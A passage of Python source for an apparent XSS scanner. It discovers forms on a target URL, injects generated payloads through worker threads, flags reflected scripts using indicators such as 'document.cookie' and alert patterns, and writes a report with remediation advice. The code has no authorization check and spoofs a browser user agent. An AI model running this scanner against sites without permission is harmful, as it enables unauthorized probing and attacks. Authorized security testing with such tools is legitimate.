                f.write(f"Total Vulnerabilities: {report['summary']['total_vulnerabilities']}\n")
                f.write(f"Critical Risk: {report['summary']['critical']}\n")
                f.write(f"High Risk: {report['summary']['high']}\n")
                f.write(f"Medium Risk: {report['summary']['medium']}\n")
                f.write(f"Low Risk: {report['summary']['low']}\n\n")
                
                # Write detailed vulnerabilities
                if self.vulnerabilities:
                    f.write("DETAILED VULNERABILITY REPORTS:\n")
                    f.write("="*80 + "\n\n")
                    
                    for i, vuln in enumerate(self.vulnerabilities, 1):
                        f.write(f"VULNERABILITY #{i}:\n")
                        f.write("-"*40 + "\n")
                        f.write(f"ID: {vuln['id']}\n")
                        f.write(f"Timestamp: {vuln['timestamp']}\n")
                        f.write(f"URL: {vuln['url']}\n")
                        f.write(f"Form ID: {vuln['form_id']}\n")
                        f.write(f"Form Action: {vuln['form_action']}\n")
                        f.write(f"Method: {vuln['method']}\n")
                        f.write(f"Parameter: {vuln['parameter']}\n")
                        f.write(f"Parameter Type: {vuln['parameter_type']}\n")
                        f.write(f"Risk Level: {vuln['risk_level']}\n")
                        f.write(f"Confidence: {vuln['confidence']}\n")
                        f.write(f"Detection Reason: {vuln['detection_reason']}\n\n")
                        
                        f.write(f"PAYLOAD:\n")
                        f.write(f"{vuln['payload']}\n\n")
                        
                        if vuln.get('contexts'):
                            f.write(f"CONTEXTS:\n")
                            for j, ctx in enumerate(vuln['contexts'], 1):
                                f.write(f"Context #{j} ({ctx['type']}):\n")
                                f.write(f"Position: {ctx['position']}\n")
                                f.write(f"Before: {ctx['surrounding']['before']}\n")
                                f.write(f"After: {ctx['surrounding']['after']}\n")
                                f.write(f"Full Context: {ctx['context']}\n\n")
                        
                        if vuln.get('response_headers'):
                            f.write(f"RESPONSE HEADERS:\n")
                            for header, value in vuln['response_headers'].items():
                                f.write(f"{header}: {value}\n")
                            f.write("\n")
                        
                        f.write("="*80 + "\n\n")
                
                # Write recommendations
                f.write("SECURITY RECOMMENDATIONS:\n")
                f.write("="*80 + "\n")
                f.write("1. Input Validation:\n")
                f.write("   - Implement strict input validation on all user inputs\n")
                f.write("   - Use whitelist-based validation where possible\n")
                f.write("   - Validate input length, format, and content\n\n")
                
                f.write("2. Output Encoding:\n")
                f.write("   - Always encode output based on context (HTML, JavaScript, CSS, URL)\n")
                f.write("   - Use proper encoding functions provided by your framework\n")
                f.write("   - Never trust user input, even if validated\n\n")
                
                f.write("3. Content Security Policy (CSP):\n")
                f.write("   - Implement a strict CSP header\n")
                f.write("   - Use 'unsafe-inline' and 'unsafe-eval' sparingly\n")
                f.write("   - Regularly review and update CSP policies\n\n")
                
                f.write("4. Security Headers:\n")
                f.write("   - Implement X-XSS-Protection header\n")
                f.write("   - Use X-Content-Type-Options: nosniff\n")
                f.write("   - Set X-Frame-Options to prevent clickjacking\n\n")
                
                f.write("5. Framework Security Features:\n")
                f.write("   - Use your framework's built-in XSS protection\n")
                f.write("   - Enable auto-escaping in template engines\n")
                f.write("   - Keep frameworks and libraries updated\n\n")
            
            print(f"\n{Colors.GREEN}[INFO] Detailed report saved to: {self.output_file}{Colors.END}")
            
        except Exception as e:
            self.logger.error(f"Failed to save report to file: {str(e)}")
            print(f"{Colors.RED}[ERROR] Failed to save report: {str(e)}{Colors.END}")
    
    def _calculate_scan_duration(self):
        """Calculate scan duration"""
        if self.scan_stats['start_time'] and self.scan_stats['end_time']:
            duration = self.scan_stats['end_time'] - self.scan_stats['start_time']
            return f"{duration:.2f} seconds"
        return "Unknown"
    
    def start_scan(self):
        """Mark scan start time"""
        self.scan_stats['start_time'] = time.time()
    
    def end_scan(self):
        """Mark scan end time"""
        self.scan_stats['end_time'] = time.time()

class AdvancedXSSScanner:
    """
    Main XSS Scanner class that orchestrates the entire scanning process
    """
    
    def __init__(self, target_url, threads=10, delay=1, timeout=30, user_agent=None):
        self.target_url = target_url
        self.threads = threads
        self.delay = delay
        self.timeout = timeout
        self.session = self._create_session()
        
        # Initialize components
        self.payload_generator = XSSPayloadGenerator()
        self.form_extractor = FormExtractor(self.session)
        self.xss_detector = XSSDetector(self.session, self.payload_generator)
        self.reporter = VulnerabilityReporter()
        
        # Scanner state
        self.forms = []
        self.tested_combinations = set()
        self.request_queue = queue.Queue()
        
        # Set custom user agent if provided
        if user_agent:
            self.session.headers.update({'User-Agent': user_agent})
        else:
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            })
    
    def _create_session(self):
        """Create HTTP session with retry strategy"""
        session = requests.Session()
        
        # Configure retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Set timeout
        session.timeout = self.timeout
        
        # Common headers
        session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        return session
    
    def scan(self):
        """Main scanning method"""
        print(f"{Colors.CYAN}{Colors.BOLD}Advanced XSS Scanner v1.0{Colors.END}")
        print(f"{Colors.CYAN}{'='*50}{Colors.END}")
        print(f"{Colors.BLUE}Target URL: {self.target_url}{Colors.END}")
        print(f"{Colors.BLUE}Threads: {self.threads}{Colors.END}")
        print(f"{Colors.BLUE}Delay: {self.delay}s{Colors.END}")
        print(f"{Colors.BLUE}Timeout: {self.timeout}s{Colors.END}")
        print()
        
        self.reporter.start_scan()
        
        try:
            # Step 1: Discover forms
            print(f"{Colors.YELLOW}[1/4] Discovering forms...{Colors.END}")
            self._discover_forms()
            
            # Step 2: Analyze forms
            print(f"{Colors.YELLOW}[2/4] Analyzing forms...{Colors.END}")
            self._analyze_forms()
            
            # Step 3: Generate payloads
            print(f"{Colors.YELLOW}[3/4] Generating payloads...{Colors.END}")
            self._generate_payloads()
            
            # Step 4: Test for XSS
            print(f"{Colors.YELLOW}[4/4] Testing for XSS vulnerabilities...{Colors.END}")
            self._test_xss_vulnerabilities()
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[INFO] Scan interrupted by user{Colors.END}")
        except Exception as e:
            print(f"\n{Colors.RED}[ERROR] Scan failed: {str(e)}{Colors.END}")
            self.reporter.logger.error(f"Scan failed: {str(e)}")
        finally:
            self.reporter.end_scan()
            self._generate_final_report()
    
    def _discover_forms(self):
        """Discover all forms on the target URL"""
        try:
            print(f"{Colors.BLUE}[INFO] Fetching target URL: {self.target_url}{Colors.END}")
            response = self.session.get(self.target_url)
            response.raise_for_status()
            
            # Extract forms
            self.forms = self.form_extractor.extract_forms(self.target_url, response.text)
            
            print(f"{Colors.GREEN}[SUCCESS] Found {len(self.forms)} form(s){Colors.END}")
            
            # Display form information
            for i, form in enumerate(self.forms):
                print(f"{Colors.CYAN}Form #{i+1}:{Colors.END}")
                print(f"  Action: {form['action']}")
                print(f"  Method: {form['method']}")
                print(f"  Inputs: {len(form['inputs'])}")
                print(f"  ID: {form['id']}")
                
                if form['csrf_tokens']:
                    print(f"  CSRF Tokens: {len(form['csrf_tokens'])}")
                
                if form['file_uploads']:
                    print(f"  File Uploads: {len(form['file_uploads'])}")
                
                print()
            
            self.reporter.scan_stats['total_forms'] = len(self.forms)
            
        except requests.exceptions.RequestException as e:
            error_msg = f"Failed to fetch target URL: {str(e)}"
            print(f"{Colors.RED}[ERROR] {error_msg}{Colors.END}")
            self.reporter.logger.error(error_msg)
            self.reporter.scan_stats['errors'] += 1
            raise
    
    def _analyze_forms(self):
        """Analyze discovered forms for testing potential"""
        print(f"{Colors.BLUE}[INFO] Analyzing form structures...{Colors.END}")
        
        for form in self.forms:
            # Analyze input types
            input_types = {}
            testable_inputs = []
            
            for inp in form['inputs']:
                input_type = inp['type']
                input_types[input_type] = input_types.get(input_type, 0) + 1
                
                # Determine if input is testable
                if self._is_input_testable(inp):
                    testable_inputs.append(inp)
            
            form['input_types'] = input_types
            form['testable_inputs'] = testable_inputs
            
            print(f"{Colors.CYAN}Form {form['id']} analysis:{Colors.END}")
            print(f"  Total inputs: {len(form['inputs'])}")
            print(f"  Testable inputs: {len(testable_inputs)}")
            print(f"  Input types: {input_types}")
            
            if form['javascript_handlers']:
                print(f"  JavaScript handlers: {len(form['javascript_handlers'])}")
            
            print()
    
    def _is_input_testable(self, input_field):
        """Determine if an input field is testable for XSS"""
        # Skip disabled and readonly fields
        if input_field['disabled'] or input_field['readonly']:
            return False
        
        # Skip certain input types
        skip_types = ['hidden', 'submit', 'button', 'reset', 'image']
        if input_field['type'] in skip_types:
            return False
        
        # Skip fields without names
        if not input_field['name']:
            return False
        
        return True
    
    def _generate_payloads(self):
        """Generate payloads for testing"""
        print(f"{Colors.BLUE}[INFO] Generating XSS payloads...{Colors.END}")
        
        # Get all payloads
        all_payloads = self.payload_generator.get_all_payloads()
        
        print(f"{Colors.GREEN}[SUCCESS] Generated {len(all_payloads)} payloads{Colors.END}")
        
        # Create test combinations
        test_combinations = []
        
        for form in self.forms:
            for input_field in form['testable_inputs']:
                # Get context-specific payloads
                context_payloads = self.payload_generator.get_context_payloads(input_field['tag'])
                
                # Get custom payloads for this field
                custom_payloads = self.payload_generator.generate_custom_payload(
                    input_field['name'], 
                    input_field['type']
                )
                
                # Combine all payloads
                field_payloads = list(set(all_payloads + context_payloads + custom_payloads))
                
                for payload in field_payloads:
                    test_combinations.append({
                        'form': form,
                        'input': input_field,
                        'payload': payload
                    })
        
        self.test_combinations = test_combinations
        self.reporter.scan_stats['total_payloads'] = len(test_combinations)
        
        print(f"{Colors.GREEN}[SUCCESS] Created {len(test_combinations)} test combinations{Colors.END}")
    
    def _test_xss_vulnerabilities(self):
        """Test for XSS vulnerabilities using threading"""
        print(f"{Colors.BLUE}[INFO] Testing XSS vulnerabilities with {self.threads} threads...{Colors.END}")
        
        # Add all test combinations to queue
        for combination in self.test_combinations:
            self.request_queue.put(combination)
        
        # Start worker threads
        threads = []
        for i in range(self.threads):
            thread = threading.Thread(target=self._worker_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Wait for all tests to complete
        self.request_queue.join()
        
        print(f"{Colors.GREEN}[SUCCESS] Completed XSS vulnerability testing{Colors.END}")
    
    def _worker_thread(self, thread_id):
        """Worker thread for testing XSS vulnerabilities"""
        while True:
            try:
                # Get test combination from queue
                combination = self.request_queue.get(timeout=1)
                
                # Test the combination
                self._test_single_combination(combination, thread_id)
                
                # Mark task as done
                self.request_queue.task_done()
                
                # Add delay between requests
                if self.delay > 0:
                    time.sleep(self.delay + random.uniform(0, 0.5))
                
            except queue.Empty:
                break
            except Exception as e:
                self.reporter.logger.error(f"Worker thread {thread_id} error: {str(e)}")
                self.reporter.scan_stats['errors'] += 1
                self.request_queue.task_done()
    
    def _test_single_combination(self, combination, thread_id):
        """Test a single form/input/payload combination"""
        form = combination['form']
        input_field = combination['input']
        payload = combination['payload']
        
        try:
            # Build form data
            form_data = self._build_form_data(form, input_field, payload)
            
            # Make request
            if form['method'] == 'GET':
                response = self._make_get_request(form, form_data)
            else:
                response = self._make_post_request(form, form_data)
            
            self.reporter.scan_stats['total_requests'] += 1
            
            # Check for XSS
            is_vulnerable, detection_reason = self.xss_detector.detect_xss(response.text, payload)
            
            if is_vulnerable:
                # Analyze response context
                contexts = self.xss_detector.analyze_response_context(response.text, payload)
                
                # Create vulnerability record
                vulnerability = {
                    'url': form['action'],
                    'form_id': form['id'],
                    'form_action': form['action'],
                    'method': form['method'],
                    'parameter': input_field['name'],
                    'parameter_type': input_field['type'],
                    'payload': payload,
                    'detection_reason': detection_reason,
                    'contexts': contexts,
                    'response_length': len(response.text),
                    'response_headers': dict(response.headers),
                    'status_code': response.status_code,
                    'risk_level': self._assess_risk_level(contexts, payload),
                    'confidence': self._assess_confidence(contexts, detection_reason),
                }
                
                # Add to reporter
                self.reporter.add_vulnerability(vulnerability)
                
                # Print immediate notification
                print(f"{Colors.RED}[VULN] XSS found in form {form['id']}, parameter {input_field['name']}{Colors.END}")
        
        except requests.exceptions.RequestException as e:
            self.reporter.logger.warning(f"Request failed for {form['action']}: {str(e)}")
            self.reporter.scan_stats['errors'] += 1
        except Exception as e:
            self.reporter.logger.error(f"Unexpected error testing combination: {str(e)}")
            self.reporter.scan_stats['errors'] += 1
    
    def _build_form_data(self, form, target_input, payload):
        """Build form data for request"""
        form_data = {}
        
        # Add all form inputs
        for input_field in form['inputs']:
            name = input_field['name']
            if not name:
                continue
            
            if input_field == target_input:
                # Use payload for target input
                form_data[name] = payload
            else:
                # Use default or sample values for other inputs
                value = self._get_default_value(input_field)
                if value is not None:
                    form_data[name] = value
        
        return form_data
    
    def _get_default_value(self, input_field):
        """Get default value for input field"""
        input_type = input_field['type']
        
        # Use existing value if available
        if input_field['value']:
            return input_field['value']
        
        # Generate appropriate default values
        default_values = {
            'text': 'test',
            'email': 'test@example.com',
            'password': 'password123',
            'search': 'search',
            'url': 'http://example.com',
            'tel': '1234567890',
            'number': '123',
            'range': '50',
            'date': '2023-01-01',
            'time': '12:00',
            'datetime-local': '2023-01-01T12:00',
            'month': '2023-01',
            'week': '2023-W01',
            'color': '#000000',
            'checkbox': 'on',
            'radio': input_field.get('value', 'on'),
        }
        
        if input_type in default_values:
            return default_values[input_type]
        
        # Handle select fields
        if input_field['tag'] == 'select' and input_field.get('options'):
            for option in input_field['options']:
                if option['value']:
                    return option['value']
        
        # Handle textarea
        if input_field['tag'] == 'textarea':
            return 'test content'
        
        return 'test'
    
    def _make_get_request(self, form, form_data):
        """Make GET request with form data"""
        url = form['action']
        if form_data:
            query_string = urlencode(form_data)
            separator = '&' if '?' in url else '?'
            url = f"{url}{separator}{query_string}"
        
        response = self.session.get(url)
        response.raise_for_status()
        return response
    
    def _make_post_request(self, form, form_data):
        """Make POST request with form data"""
        url = form['action']
        
        # Determine content type
        if form['enctype'] == 'multipart/form-data':
            # Don't set content-type header, let requests handle it
            response = self.session.post(url, files=form_data)
        else:
            # Standard form submission
            response = self.session.post(url, data=form_data)
        
        response.raise_for_status()
        return response
    
    def _assess_risk_level(self, contexts, payload):
        """Assess risk level of vulnerability"""
        # Check for high-risk indicators
        high_risk_indicators = [
            'document.cookie',
            'document.location',
            'window.location',
            'eval(',
            'Function(',
            'setTimeout(',
            'setInterval(',
        ]
        
        # Check contexts
        for context in contexts:
            if context['type'] in ['script_content', 'javascript_url', 'event_handler']:
                return 'Critical'
        
        # Check payload content
        for indicator in high_risk_indicators:
            if indicator in payload:
                return 'High'
        
        # Check for DOM manipulation
        if any('innerHTML' in ctx['context'] or 'document.write' in ctx['context'] for ctx in contexts):
            return 'High'
        
        # Default to medium for reflected XSS
        return 'Medium'
    
    def _assess_confidence(self, contexts, detection_reason):
        """Assess confidence level of detection"""
        # High confidence indicators
        high_confidence_patterns = [
            'script.*alert',
            'onerror.*alert',
            'onload.*alert',
            'javascript:.*alert',
        ]
        
        for pattern in high_confidence_patterns:
            if re.search(pattern, detection_reason, re.IGNORECASE):
                return 'High'
        
        # Check context types
        high_confidence_contexts = ['script_content', 'javascript_url', 'event_handler']
        if any(ctx['type'] in high_confidence_contexts for ctx in contexts):
            return 'High'
        
        return 'Medium'
    
    def _generate_final_report(self):
        """Generate final vulnerability report"""
        print(f"\n{Colors.CYAN}[INFO] Generating final report...{Colors.END}")
        
        # Print summary to console
        self.reporter.print_vulnerability_summary()
        
        # Save detailed report to file
        self.reporter.save_to_file()
        
        # Print scan statistics
        stats = self.reporter.scan_stats
        print(f"\n{Colors.BLUE}SCAN STATISTICS:{Colors.END}")
        print(f"{Colors.BLUE}{'='*40}{Colors.END}")
        print(f"Duration: {self.reporter._calculate_scan_duration()}")
        print(f"Forms Scanned: {stats['total_forms']}")
        print(f"Payloads Tested: {stats['total_payloads']}")
        print(f"Requests Made: {stats['total_requests']}")
        print(f"Vulnerabilities Found: {stats['vulnerabilities_found']}")
        print(f"Errors: {stats['errors']}")
        print()

def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description="Advanced XSS Scanner - OWASP ZAP Style",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python xss_scanner.py -u http://example.com/login
  python xss_scanner.py -u http://example.com -t 20 -d 0.5
  python xss_scanner.py -u http://example.com --timeout 60 --user-agent "Custom Agent"
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL to scan')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-d', '--delay', type=float, default=1.0, help='Delay between requests in seconds (default: 1.0)')
    parser.add_argument('--timeout', type=int, default=30, help='Request timeout in seconds (default: 30)')
    parser.add_argument('--user-agent', help='Custom User-Agent string')
    parser.add_argument('-o', '--output', default='output.txt', help='Output file for detailed report (default: output.txt)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose logging')
    
    args = parser.parse_args()
    
    # Validate URL
    parsed_url = urlparse(args.url)
    if not parsed_url.scheme or not parsed_url.netloc:
        print(f"{Colors.RED}[ERROR] Invalid URL format. Please include protocol (http:// or https://){Colors.END}")
        sys.exit(1)
    
    # Set logging level
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    try:
        # Create scanner instance
        scanner = AdvancedXSSScanner(
            target_url=args.url,
            threads=args.threads,
            delay=args.delay,
            timeout=args.timeout,
            user_agent=args.user_agent
        )
        
        # Set output file
        scanner.reporter.output_file = args.output
        
        # Start scanning
        scanner.scan()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[INFO] Scan interrupted by user{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[ERROR] Scanner failed: {str(e)}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()